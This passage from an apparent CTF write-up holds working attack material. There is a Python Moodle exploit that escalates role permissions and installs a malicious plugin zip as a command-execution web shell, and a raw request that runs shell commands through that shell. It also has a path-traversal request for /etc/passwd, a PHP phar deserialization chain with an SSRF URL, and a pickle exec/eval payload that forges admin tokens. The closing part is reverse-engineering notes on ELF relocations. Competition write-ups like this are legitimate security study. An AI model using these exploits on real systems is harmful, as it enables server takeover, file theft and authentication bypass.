od/assignment:submit','1'),('mod/assignment:view','1'),('mod/book:edit','1'),('mod/book:read','1'),('mod/book:viewhiddenchapters','1'),('mod/chat:chat','1'),('mod/chat:deletelog','1'),('mod/chat:exportparticipatedsession','1'),('mod/chat:exportsession','1'),('mod/chat:readlog','1'),('mod/chat:view','1'),('mod/choice:choose','1'),('mod/choice:deleteresponses','1'),('mod/choice:downloadresponses','1'),('mod/choice:readresponses','1'),('mod/choice:view','1'),('mod/data:approve','1'),('mod/data:comment','1'),('mod/data:exportallentries','1'),('mod/data:exportentry','1'),('mod/data:exportownentry','1'),('mod/data:exportuserinfo','1'),('mod/data:managecomments','1'),('mod/data:manageentries','1'),('mod/data:managetemplates','1'),('mod/data:manageuserpresets','1'),('mod/data:rate','1'),('mod/data:view','1'),('mod/data:viewallratings','1'),('mod/data:viewalluserpresets','1'),('mod/data:viewanyrating','1'),('mod/data:viewentry','1'),('mod/data:viewrating','1'),('mod/data:writeentry','1'),('mod/feedback:complete','1'),('mod/feedback:createprivatetemplate','1'),('mod/feedback:createpublictemplate','1'),('mod/feedback:deletesubmissions','1'),('mod/feedback:deletetemplate','1'),('mod/feedback:edititems','1'),('mod/feedback:mapcourse','1'),('mod/feedback:receivemail','1'),('mod/feedback:view','1'),('mod/feedback:viewanalysepage','1'),('mod/feedback:viewreports','1'),('mod/folder:managefiles','1'),('mod/folder:view','1'),('mod/forum:addnews','1'),('mod/forum:addquestion','1'),('mod/forum:allowforcesubscribe','1'),('mod/forum:canoverridecutoff','1'),('mod/forum:canoverridediscussionlock','1'),('mod/forum:canposttomygroups','1'),('mod/forum:cantogglefavourite','1'),('mod/forum:createattachment','1'),('mod/forum:deleteanypost','1'),('mod/forum:deleteownpost','1'),('mod/forum:editanypost','1'),('mod/forum:exportdiscussion','1'),('mod/forum:exportforum','1'),('mod/forum:exportownpost','1'),('mod/forum:exportpost','1'),('mod/forum:grade','1'),('mod/forum:managesubscriptions','1'),('mod/forum:movediscussions','1'),('mod/forum:pindiscussions','1'),('mod/forum:postprivatereply','1'),('mod/forum:postwithoutthrottling','1'),('mod/forum:rate','1'),('mod/forum:readprivatereplies','1'),('mod/forum:replynews','1'),('mod/forum:replypost','1'),('mod/forum:splitdiscussions','1'),('mod/forum:startdiscussion','1'),('mod/forum:viewallratings','1'),('mod/forum:viewanyrating','1'),('mod/forum:viewdiscussion','1'),('mod/forum:viewhiddentimedposts','1'),('mod/forum:viewqandawithoutposting','1'),('mod/forum:viewrating','1'),('mod/forum:viewsubscribers','1'),('mod/glossary:approve','1'),('mod/glossary:comment','1'),('mod/glossary:export','1'),('mod/glossary:exportentry','1'),('mod/glossary:exportownentry','1'),('mod/glossary:import','1'),('mod/glossary:managecategories','1'),('mod/glossary:managecomments','1'),('mod/glossary:manageentries','1'),('mod/glossary:rate','1'),('mod/glossary:view','1'),('mod/glossary:viewallratings','1'),('mod/glossary:viewanyrating','1'),('mod/glossary:viewrating','1'),('mod/glossary:write','1'),('mod/h5pactivity:reviewattempts','1'),('mod/h5pactivity:submit','1'),('mod/h5pactivity:view','1'),('mod/imscp:view','1'),('mod/label:view','1'),('mod/lesson:edit','1'),('mod/lesson:grade','1'),('mod/lesson:manage','1'),('mod/lesson:manageoverrides','1'),('mod/lesson:view','1'),('mod/lesson:viewreports','1'),('mod/lti:admin','1'),('mod/lti:manage','1'),('mod/lti:view','1'),('mod/page:view','1'),('mod/quiz:attempt','1'),('mod/quiz:deleteattempts','1'),('mod/quiz:emailconfirmsubmission','1'),('mod/quiz:emailnotifysubmission','1'),('mod/quiz:emailwarnoverdue','1'),('mod/quiz:grade','1'),('mod/quiz:ignoretimelimits','1'),('mod/quiz:manage','1'),('mod/quiz:manageoverrides','1'),('mod/quiz:preview','1'),('mod/quiz:regrade','1'),('mod/quiz:reviewmyattempts','1'),('mod/quiz:view','1'),('mod/quiz:viewreports','1'),('mod/resource:view','1'),('mod/scorm:deleteownresponses','1'),('mod/scorm:deleteresponses','1'),('mod/scorm:savetrack','1'),('mod/scorm:skipview','1'),('mod/scorm:viewreport','1'),('mod/scorm:viewscores','1'),('mod/survey:download','1'),('mod/survey:participate','1'),('mod/survey:readresponses','1'),('mod/url:view','1'),('mod/wiki:createpage','1'),('mod/wiki:editcomment','1'),('mod/wiki:editpage','1'),('mod/wiki:managecomment','1'),('mod/wiki:managefiles','1'),('mod/wiki:managewiki','1'),('mod/wiki:overridelock','1'),('mod/wiki:viewcomment','1'),('mod/wiki:viewpage','1'),('mod/workshop:allocate','1'),('mod/workshop:deletesubmissions','1'),('mod/workshop:editdimensions','1'),('mod/workshop:exportsubmissions','1'),('mod/workshop:ignoredeadlines','1'),('mod/workshop:manageexamples','1'),('mod/workshop:overridegrades','1'),('mod/workshop:peerassess','1'),('mod/workshop:publishsubmissions','1'),('mod/workshop:submit','1'),('mod/workshop:switchphase','1'),('mod/workshop:view','1'),('mod/workshop:viewallassessments','1'),('mod/workshop:viewallsubmissions','1'),('mod/workshop:viewauthornames','1'),('mod/workshop:viewauthorpublished','1'),('mod/workshop:viewpublishedsubmissions','1'),('mod/workshop:viewreviewernames','1'),('moodle/backup:backupactivity','1'),('moodle/competency:coursecompetencyconfigure','1'),('moodle/course:activityvisibility','1'),('moodle/course:ignoreavailabilityrestrictions','1'),('moodle/course:manageactivities','1'),('moodle/course:togglecompletion','1'),('moodle/course:viewhiddenactivities','1'),('moodle/h5p:deploy','1'),('moodle/h5p:setdisplayoptions','1'),('moodle/h5p:updatelibraries','1'),('moodle/site:accessallgroups','1'),('moodle/site:managecontextlocks','1'),('moodle/site:trustcontent','1'),('moodle/site:viewanonymousevents','1'),('moodle/site:viewfullnames','1'),('moodle/site:viewuseridentity','1'),('quiz/grading:viewidnumber','1'),('quiz/grading:viewstudentnames','1'),('quiz/statistics:view','1'),('quizaccess/seb:bypassseb','1'),('quizaccess/seb:manage_filemanager_sebconfigfile','1'),('quizaccess/seb:manage_seb_activateurlfiltering','1'),('quizaccess/seb:manage_seb_allowedbrowserexamkeys','1'),('quizaccess/seb:manage_seb_allowreloadinexam','1'),('quizaccess/seb:manage_seb_allowspellchecking','1'),('quizaccess/seb:manage_seb_allowuserquitseb','1'),('quizaccess/seb:manage_seb_enableaudiocontrol','1'),('quizaccess/seb:manage_seb_expressionsallowed','1'),('quizaccess/seb:manage_seb_expressionsblocked','1'),('quizaccess/seb:manage_seb_filterembeddedcontent','1'),('quizaccess/seb:manage_seb_linkquitseb','1'),('quizaccess/seb:manage_seb_muteonstartup','1'),('quizaccess/seb:manage_seb_quitpassword','1'),('quizaccess/seb:manage_seb_regexallowed','1'),('quizaccess/seb:manage_seb_regexblocked','1'),('quizaccess/seb:manage_seb_requiresafeexambrowser','1'),('quizaccess/seb:manage_seb_showkeyboardlayout','1'),('quizaccess/seb:manage_seb_showreloadbutton','1'),('quizaccess/seb:manage_seb_showsebdownloadlink','1'),('quizaccess/seb:manage_seb_showsebtaskbar','1'),('quizaccess/seb:manage_seb_showtime','1'),('quizaccess/seb:manage_seb_showwificontrol','1'),('quizaccess/seb:manage_seb_templateid','1'),('quizaccess/seb:manage_seb_userconfirmquit','1'),('repository/areafiles:view','1'),('repository/boxnet:view','1'),('repository/contentbank:view','1'),('repository/coursefiles:view','1'),('repository/dropbox:view','1'),('repository/equella:view','1'),('repository/filesystem:view','1'),('repository/flickr:view','1'),('repository/flickr_public:view','1'),('repository/googledocs:view','1'),('repository/local:view','1'),('repository/merlot:view','0'),('repository/nextcloud:view','1'),('repository/onedrive:view','1'),('repository/picasa:view','1'),('repository/recent:view','1'),('repository/s3:view','1'),('repository/skydrive:view','1'),('repository/upload:view','1'),('repository/url:view','1'),('repository/user:view','1'),('repository/webdav:view','1'),('repository/wikimedia:view','1'),('repository/youtube:view','1'),('block/activity_modules:addinstance','1'),('block/activity_results:addinstance','1'),('block/admin_bookmarks:addinstance','1'),('block/badges:addinstance','1'),('block/blog_menu:addinstance','1'),('block/blog_recent:addinstance','1'),('block/blog_tags:addinstance','1'),('block/calendar_month:addinstance','1'),('block/calendar_upcoming:addinstance','1'),('block/comments:addinstance','1'),('block/completionstatus:addinstance','1'),('block/course_list:addinstance','1'),('block/course_summary:addinstance','1'),('block/feedback:addinstance','1'),('block/globalsearch:addinstance','1'),('block/glossary_random:addinstance','1'),('block/html:addinstance','1'),('block/login:addinstance','1'),('block/mentees:addinstance','1'),('block/mnet_hosts:addinstance','1'),('block/myprofile:addinstance','1'),('block/navigation:addinstance','1'),('block/news_items:addinstance','1'),('block/online_users:addinstance','1'),('block/online_users:viewlist','1'),('block/private_files:addinstance','1'),('block/quiz_results:addinstance','1'),('block/recent_activity:addinstance','1'),('block/rss_client:addinstance','1'),('block/rss_client:manageanyfeeds','1'),('block/rss_client:manageownfeeds','1'),('block/search_forums:addinstance','1'),('block/section_links:addinstance','1'),('block/selfcompletion:addinstance','1'),('block/settings:addinstance','1'),('block/site_main_menu:addinstance','1'),('block/social_activities:addinstance','1'),('block/tag_flickr:addinstance','1'),('block/tag_youtube:addinstance','1'),('block/tags:addinstance','1'),('moodle/block:edit','1'),('moodle/block:view','1'),('moodle/site:manageblocks','1'),('savechanges','Save changes')]


    r = session.post(url + '/admin/roles/define.php', params=data_get, data=data_post)


    # Above we modify description field, so, if script find that description on site, we are good.
    if random_desc not in r.text:
        p6.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nTrouble updating fields\n")
        exit(1)
    else:
        r = session.get(url + '/admin/search.php')
        if "Install plugins" not in r.text:
            p6.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nModified fields but the options to install plugins have not been enabled.")
            print(Color.RED + "- (This is weird, sometimes he does it, sometimes he doesn't!!) Try again.\n")
            exit(1)


    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]
    
    p6.success(Color.YELLOW + "✓" + Color.END)
    time.sleep(1)


    return session, sess_key


def zipb64_up(session, url, sess_key, teacher_user, course_id):
    '''
    Doing upload of zip file as base64 binary data
        * https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/
    '''


    p7 = log.progress("Uploading malicious " + Color.BLUE + ".zip" + Color.END + " file")


    r = session.get(url + '/admin/tool/installaddon/index.php')
    zipfile_id = re.findall(r'name="zipfile" id="id_zipfile" value="(.*?)"', r.text)[0]
    client_id = re.findall(r'"client_id":"(.*?)"', r.text)[0]


    # Upupup
    data_get = {"action":"upload"}
    data_post = {
        "title" : "",
        "author" : teacher_user,
        "license" : "unknown",
        "itemid" : [zipfile_id, zipfile_id],
        "accepted_types[]" : [".zip",".zip"],
        "repo_id" : course_id,
        "p" : "",
        "page" : "",
        "env" : "filepicker",
        "sesskey" : sess_key,
        "client_id" : client_id,
        "maxbytes" : "-1",
        "areamaxbytes" : "-1",
        "ctx_id" : "1",
        "savepath" : "/"
    }


    zip_b64 = 'UEsDBAoAAAAAAOVa0VAAAAAAAAAAAAAAAAAEAAAAcmNlL1BLAwQKAAAAAACATtFQAAAAAAAAAAAAAAAACQAAAHJjZS9sYW5nL1BLAwQKAAAAAAB2bdFQAAAAAAAAAAAAAAAADAAAAHJjZS9sYW5nL2VuL1BLAwQUAAAACAD4W9FQA9MUliAAAAAeAAAAGQAAAHJjZS9sYW5nL2VuL2Jsb2NrX3JjZS5waHCzsS/IKFAoriwuSc3VUIl3dw2JVk/OTVGP1bRWsLcDAFBLAwQUAAAACAB6bdFQtXxvb0EAAABJAAAADwAAAHJjZS92ZXJzaW9uLnBocLOxL8goUODlUinIKU3PzNO1K0stKs7Mz1OwVTAyMDIwMDM0NzCwRpJPzs8tyM9LzSsBqlBPyslPzo4vSk5VtwYAUEsBAh8ACgAAAAAA5VrRUAAAAAAAAAAAAAAAAAQAJAAAAAAAAAAQAAAAAAAAAHJjZS8KACAAAAAAAAEAGAB/2bACX0TWAWRC9B9fRNYBhvTzH19E1gFQSwECHwAKAAAAAACATtFQAAAAAAAAAAAAAAAACQAkAAAAAAAAABAAAAAiAAAAcmNlL2xhbmcvCgAgAAAAAAABABgArE3mRVJE1gGOG/QfX0TWAYb08x9fRNYBUEsBAh8ACgAAAAAAdm3RUAAAAAAAAAAAAAAAAAwAJAAAAAAAAAAQAAAASQAAAHJjZS9sYW5nL2VuLwoAIAAAAAAAAQAYAMIcIaZyRNYBwhwhpnJE1gGOG/QfX0TWAVBLAQIfABQAAAAIAPhb0VAD0xSWIAAAAB4AAAAZACQAAAAAAAAAIAAAAHMAAAByY2UvbGFuZy9lbi9ibG9ja19yY2UucGhwCgAgAAAAAAABABgA1t0sN2BE1gHW3Sw3YETWAfYt6i9fRNYBUEsBAh8AFAAAAAgAem3RULV8b29BAAAASQAAAA8AJAAAAAAAAAAgAAAAygAAAHJjZS92ZXJzaW9uLnBocAoAIAAAAAAAAQAYAO6e2qlyRNYB7p7aqXJE1gFkQvQfX0TWAVBLBQYAAAAABQAFANsBAAA4AQAAAAA='
    zip_file_bytes = zip_b64.encode('utf-8')
    zip_file_b64 = base64.decodebytes(zip_file_bytes)


    data_file = [
        ('repo_upload_file',
            ('rce.zip', zip_file_b64, 'application/zip'))]


    r = session.post(url + '/repository/repository_ajax.php', params=data_get, data=data_post, files=data_file)
    if "rce.zip" not in r.text:
        p7.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError uploading zip file.\n")
        exit(1)


    # Trying to load file
    data_post = {
        "sesskey" : sess_key,
        "_qf__tool_installaddon_installfromzip_form" : "1",
        "mform_showmore_id_general" : "0",
        "mform_isexpanded_id_general" : "1",
        "zipfile" : zipfile_id,
        "plugintype" : "",
        "rootdir" : "",
        "submitbutton" : "Install plugin from the ZIP file"
    }


    r = session.post(url + '/admin/tool/installaddon/index.php', data=data_post)
    if "Validation successful, installation can continue" not in r.text:
        p7.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError uploading zip file, problems on plugin install.\n")
        exit(1)


    # Confirm load
    zip_storage = re.findall(r'installzipstorage=(.*?)&', r.url)[0]
    data_post = {
        "installzipcomponent" : "block_rce",
        "installzipstorage" : zip_storage,
        "installzipconfirm" : "1",
        "sesskey" : sess_key
    }


    r = session.post(url + '/admin/tool/installaddon/index.php', data=data_post)
    if "Current release information" not in r.text:
        p7.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError uploading zip file, confirmation problems.\n")
        exit(1)


    p7.success(Color.YELLOW + "✓" + Color.END)
    time.sleep(1)


    return session


def moodle_RCE(url, command):
    '''
    Remote Command Execution on system with plugin installed (malicious zip file)
    '''
    
    p8 = log.progress("Executing " + Color.BLUE + command + Color.END)
    time.sleep(1)


    data_get = {"cmd" : command}


    try:
        r = session.get(url + '/blocks/rce/lang/en/block_rce.php', params=data_get, timeout=3)
        p8.success(Color.YELLOW + "✓" + Color.END)
        time.sleep(1)
        print("\n" + Color.YELLOW + r.text + Color.END)
    except requests.exceptions.Timeout as e:
        p8.success(Color.YELLOW + "✓" + Color.END)
        time.sleep(1)
        pass


    print("[" + Color.YELLOW + "+" + Color.END + "]" + Color.GREEN + " Keep breaking ev3rYthiNg!!\n" + Color.END)


if __name__ == '__main__':
    args = arguments()
    session, id_user, sess_key = login(args.url, args.username, args.password, args.id_course, args.teacher_cookie)
    enrol2rce(session, args.url, args.id_manager, args.username, args.id_course, args.teacher_cookie, args.command)
            
```







http://47.105.60.229:8888/blocks/rce/lang/en/block_rce.php?cmd=ls

​                 ![img](https://docimg10.docs.qq.com/image/Ps8nOqPAApTsYh5q2qWzsA.png?w=1280&h=303.15789473684214)        

最后搜索得到flag



```
GET /blocks/rce/lang/en/block_rce.php?cmd=%66%69%6e%64%20%2f%65%74%63%2f%7c%78%61%72%67%73%20%67%72%65%70%20%2d%72%69%20%27%66%6c%61%67%7b%27 HTTP/1.1
Host: 47.105.52.19:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: MoodleSession=sj395bpm3hm23u9id5mif51smj
Connection: close
```







​                 ![img](https://docimg8.docs.qq.com/image/ILT-IHy2B_z-yTF7FoO5xw.png?w=1280&h=512)        



## easyweb

这是读取源码的payload



```
GET /showfile.php?f=../demo/../../../../../../../etc/passwd HTTP/1.1
Host: 47.104.95.124:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```





index.php



```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ç¥å¥çç§çå¢</title>
    <!-- css -->
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        html, body {
            width: 100%;
            height: 100%;
        }
        body {
            background-image: url("background.webp");
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: cover;
        }
        h1 {
            text-align: center;
            font-size: 3em;
            height: 10%;
            background-color: rgba(98,0,101,0.7);
            color: aliceblue;
            padding-top: 30px;
        }
        form {
            position: relative;
            background-color: rgba(0,0,0,0.71);
            top: 40%;
            left: 50%;
            transform: translate(-50% , -50%);
            height: 50%;
            width: 30%;
        }
        input {
            position: relative;
            top: 40%;
            left: 50%;
            transform: translate(-50% , -50%);
            height: 8%;
            width: 30%;
            color: cornsilk;
        }
        input[type="file"] {
            font-size: 1.2em;
            margin-bottom: 3%;
            cursor:pointer;
        }
        input[type="submit"] {
            background-color: coral;
            font-size: 1.2em;
            transition: background-color, 0.3s;
            cursor:pointer;
        }
        input[type="submit"]:hover {
            background-color: crimson;
        }
        a {
            position: relative;
            top: 40%;
            left: 45%;
            transform: translate(-50% , -50%);
            height: 8%;
            width: 30%;
            color: aliceblue;
            text-decoration: none;
            font-size: 1.2em;
            cursor:pointer;
        }
        a:hover {
            text-decoration: underline;
        }
        p.tip {
            text-align: center;
            color: blanchedalmond;
            font-size: 1.5em;
            font-family: Papyrus, serif;
        }
    </style>
</head>


<body>
<h1>æ¬¢è¿æ¥å°å¼ºç½æ¯ç§çå¢</h1>


<form action="index.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="æäº¤"><br>
    <a href="showfile.php?f=./demo.png">æ¥çç§ç</a>


    <?php
    $upload = md5("2022qwb".$_SERVER['REMOTE_ADDR']);
    @mkdir($upload, 0333, true);
    if(isset($_POST['submit'])) {
        include 'upload.php';
    }
    ?>


</form>
</body>
```





class.php





```
<?php
class Upload {
    public $file;
    public $filesize;
    public $date;
    public $tmp;
    function __construct(){
        $this->file = $_FILES["file"];
    }
    function do_upload() {
        $filename = session_id().explode(".",$this->file["name"])[0].".jpg";
        if(file_exists($filename)) {
            unlink($filename);
        }
        move_uploaded_file($this->file["tmp_name"],md5("2022qwb".$_SERVER['REMOTE_ADDR'])."/".$filename);
        echo 'upload  '."./".md5("2022qwb".$_SERVER['REMOTE_ADDR'])."/".$this->e($filename).' success!';
    }
    function e($str){
        return htmlspecialchars($str);
    }
    function upload() {
        if($this->check()) {
            $this->do_upload();
        }
    }
    function __toString(){
        return $this->file["name"];
    }
    function __get($value){
        $this->filesize->$value = $this->date;
        echo $this->tmp;
    }
    function check() {
        $allowed_types = array("jpg","png","jpeg");
        $temp = explode(".",$this->file["name"]);
        $extension = end($temp);
        if(in_array($extension,$allowed_types)) {
            return true;
        }
        else {
            echo 'Invalid file!';
            return false;
        }
    }
}


class GuestShow{
    public $file;
    public $contents;
    public function __construct($file)
    {


        $this->file=$file;
    }
    function __toString(){
        $str = $this->file->name;
        return "";
    }
    function __get($value){
        return $this->$value;
    }
    function show()
    {
        $this->contents = file_get_contents($this->file);
        $src = "data:jpg;base64,".base64_encode($this->contents);
        echo "<img src={$src} />";
    }
    function __destruct(){
        echo $this;
    }
}




class AdminShow{
    public $source;
    public $str;
    public $filter;
    public function __construct($file)
    {
        $this->source = $file;
        $this->schema = 'file:///var/www/html/';
    }
    public function __toString()
    {
        $content = $this->str[0]->source;
        $content = $this->str[1]->schema;
        return $content;
    }
    public function __get($value){
        $this->show();
        return $this->$value;
    }
    public function __set($key,$value){
        $this->$key = $value;
    }
    public function show(){
        if(preg_match('/usr|auto|log/i' , $this->source))
        {
            die("error");
        }
        $url = $this->schema . $this->source;
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_HEADER, 1);
        $response = curl_exec($curl);
        curl_close($curl);
        $src = "data:jpg;base64,".base64_encode($response);
        echo "<img src={$src} />";


    }
    public function __wakeup()
    {
        if ($this->schema !== 'file:///var/www/html/') {
            $this->schema = 'file:///var/www/html/';
        }
        if ($this->source !== 'admin.png') {
            $this->source = 'admin.png';
        }
    }
}
```





upload.php



```
<?php
error_reporting(0);
require_once('class.php');


if(isset($_SESSION)){
    if(isset($_GET['fname'])?!empty($_GET['fname']):FALSE){
        $_FILES["file"]["name"] = $_GET['fname'];
    }
    $upload = new Upload();
    $upload->upload();
}else {
    die("<p class='tip'>guest can not upload file</p>");
}
?>
```





思路: 现在的思路 在

通过文件上传过程来绕过那个session，然后再phar吧

获取可用session





```html
POST /upload.php HTTP/1.1
Host: 47.104.95.124:8080
Content-Length: 19046
Cache-Control: max-age=0
Cookie: PHPSESSID=111111dem0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqe6DjUlcWopoQAXk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


------WebKitFormBoundaryqe6DjUlcWopoQAXk
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"


zzzz
------WebKitFormBoundaryqe6DjUlcWopoQAXk
Content-Disposition: form-data; name="file"; filename="QQ&#25130;&#22270;20220730091423.jpg"
Content-Type: image/jpeg


ÿØÿà
```





然后附带Cookie: PHPSESSID=111111dem0 就可以上传文件了



showfile.php



```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ç¥å¥çç§çå¢</title>
    <!-- css -->
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        html, body {
            width: 100%;
            height: 100%;
        }
        body {
            background-color: rgba(0,0,0,0.71);
        }
        img {
            position: relative;
            top: 50%;
            left: 50%;
            transform: translate(-50% , -50%);
        }
        p.tip {
            padding-top: 10%;
            text-align: center;
            color: blanchedalmond;
            font-size: 3em;
            font-family: Papyrus, serif;
        }
    </style>
</head>


<body>
<?php
error_reporting(0);
require_once('class.php');
$filename = $_GET['f'];




if(preg_match("/http|https|bzip2|gopher|dict|zlib|data|input|%00/i", $filename)){
    die("nop");
}
else{
    if(isset($_SESSION)){
        $show = new AdminShow($filename);
        $show->show();
    }else{
        if(preg_match('/guest|demo/i',$filename)) {
            $show = new GuestShow($filename);
            $show->show();
        }else{
            die("<p class='tip'>no permission, you can only see string 'demo' and 'guest'</p>");
        }
    }
}
?>
```





可能是打SSRF？

/etc/hosts



```
10.10.10.x
10.10.10.101
```



然后构造反序列化



```
<?php
error_reporting(0);
class Upload {
    public $file;
    public $filesize;
    public $date;
    public $tmp;
    function do_upload() {
        $filename = session_id().explode(".",$this->file["name"])[0].".jpg";
        if(file_exists($filename)) {
            unlink($filename);
        }
        move_uploaded_file($this->file["tmp_name"],md5("2022qwb".$_SERVER['REMOTE_ADDR'])."/".$filename);
        echo 'upload  '."./".md5("2022qwb".$_SERVER['REMOTE_ADDR'])."/".$this->e($filename).' success!';
    }
    function e($str){
        return htmlspecialchars($str);
    }
    function upload() {
        if($this->check()) {
            $this->do_upload();
        }
    }
    function __toString(){
        return $this->file["name"];
    }
    function __get($value){
        $this->filesize->$value = $this->date;
        echo $this->tmp;
    }
    function check() {
        $allowed_types = array("jpg","png","jpeg");
        $temp = explode(".",$this->file["name"]);
        $extension = end($temp);
        if(in_array($extension,$allowed_types)) {
            return true;
        }
        else {
            echo 'Invalid file!';
            return false;
        }
    }
}


class GuestShow{
    public $file;
    public $contents;
    function __toString(){
        $str = $this->file->name;
        return "";
    }
    function __get($value){
        return $this->$value;
    }
    function show()
    {
        $this->contents = file_get_contents($this->file);
        $src = "data:jpg;base64,".base64_encode($this->contents);
        echo "<img src={$src} />";
    }
    function __destruct(){
        echo $this;
    }
}




class AdminShow{
    public $source;
    public $str;
    public $filter;
    public function __toString()
    {
        $content = $this->str[0]->source;
        $content = $this->str[1]->schema;
        return $content;
    }
    public function __get($value){
        // 访问不存在的属性也会出现这个问题
        $this->show();
        return $this->$value;
    }
    public function __set($key,$value){
        $this->$key = $value;
    }
    public function show(){
        if(preg_match('/usr|auto|log/i' , $this->source))
        {
            die("error");
        }


    }
    public function __wakeup()
    {
        if ($this->schema !== 'file:///var/www/html/') {
            $this->schema = 'file:///var/www/html/';
        }
        if ($this->source !== 'admin.png') {
            $this->source = 'admin.png';
        }
    }
}


$guest1 = new GuestShow();
$guest2 = new GuestShow();
$upload = new Upload();
$upload1 = new Upload();
$upload2 = new Upload();
$admin = new AdminShow();
$admin1 = new AdminShow();
$guest1->file = $upload;
$upload->tmp = $admin;
$admin->str[0] = $upload1;
$admin->str[1] = $upload2;
$upload1->filesize = $admin1;
$upload1->date="http://10.10.10.10?url=file:///flag";
$upload2->filesize = $admin1;
$upload2->date = "";
$upload2->tmp = $guest2;
$guest2->file = $admin1;


$phar = new Phar("dem0.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($guest1); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
?>
```





​                 ![img](https://docimg5.docs.qq.com/image/agsTbkxlN0hwvJZaVK21Lg.png?w=1280&h=622.4657534246575)        

##  crash 

生成脚本

```
import base64,pickle
from lib2to3.pgen2 import token
exec('''
class dem1:\n def __eq__(self, __o: object) -> bool:\n  return True\nclass dem0:\n username='admin'\n token=dem1()
''')


print(dem0().token==hash("11111"))
userdata=b'''(c__builtin__
exec
S'class dem0:\\n class dem1:\\n  def __eq__(self, __o: object) -> bool:\\n   return True\\n token=dem1()\\n username='admin''
o(c__builtin__
eval
S'dem0()'
o.'''
userdata = pickle.loads(userdata)
print(userdata.username)
print(userdata.token==hash("11111"))
print(base64.b64encode(userdata))
https://blog.csdn.net/qq_35789421/article/details/113572239
```



```
GET /gettestresult?server1=localhost%3A8088&weight1=10&server2=localhost%3A8087&weight2=0&server3=localhost%3A8086&weight3=0 HTTP/1.1
Host: 182.92.223.176:25370
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: */*
Referer: http://182.92.223.176:25370/balancer
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJwYXNzd29yZCI6bnVsbH0.YuTOhg.JcIz3yCezaN-mtAhqmHF62flPWE; userdata=KGNfX2J1aWx0aW5fXwpleGVjClMnY2xhc3MgdXNlcjpcbiBjbGFzcyB0b2tlOlxuICBkZWYgX19lcV9fKHNlbGYsIG8pOlxuICAgcmV0dXJuIFRydWVcbiB0b2tlbj10b2tlKClcbiB1c2VybmFtZT0nYWRtaW4nJwpvKGNfX2J1aWx0aW5fXwpldmFsClMndXNlcigpJwpvLg==
Connection: close
```





# **Reverse**



## **deeprev**

googlectf 2022 eldar 的青春版，考点是重定位，下载 glibc 源码从 ld 的代码开始调起，配合文档可以得知，R_X86_64_RELATIVE 类似于直接赋值，例如：

```
LOAD:00000000008042BA Elf64_Rela <804000h, 8, 0>            ; R_X86_64_RELATIVE
```

代表 qword ptr [804000h] = 0。

其与 R_X86_64_COPY 搭配可以实现 memcpy 的效果，例如：

```
LOAD:00000008042EA Elf64_Rela <80409Ch, 8, 404040h>        ; R_X86_64_RELATIVE
LOAD:0000000804302 Elf64_Rela <8040A4h, 8, 1>                     ; R_X86_64_RELATIVE
LOAD:000000080431A Elf64_Rela <8040CCh, 200000005h, 0>   ; R_X86_64_COPY
```



代表 memcy(0x8040CC, 0x404040, 1)，这里的 404040 就是需要输入的 secret 字符串地址。如下的两个 R_X86_64_RELATIVE 就是在向 relocation table 上写代码，稍后跳转执行：



```
LOAD:80434A Elf64_Rela <804332h, 8, 16008040CC253480h> ; R_X86_64_RELATIVE
LOAD:804362 Elf64_Rela <80433Ah, 8, 0C3h>                           ; R_X86_64_RELATIVE


804332：xor   byte ptr ds:0x8040CC, 0x16
80433A：ret
```



按照上述模式进行分析调试，可以得知 flag 的前 28 个字符（共 32 个字符）的加密和比较方法：



```
flag = b"flag{you_should_patch_me_here!!}"
cipher = [0] * len(flag)
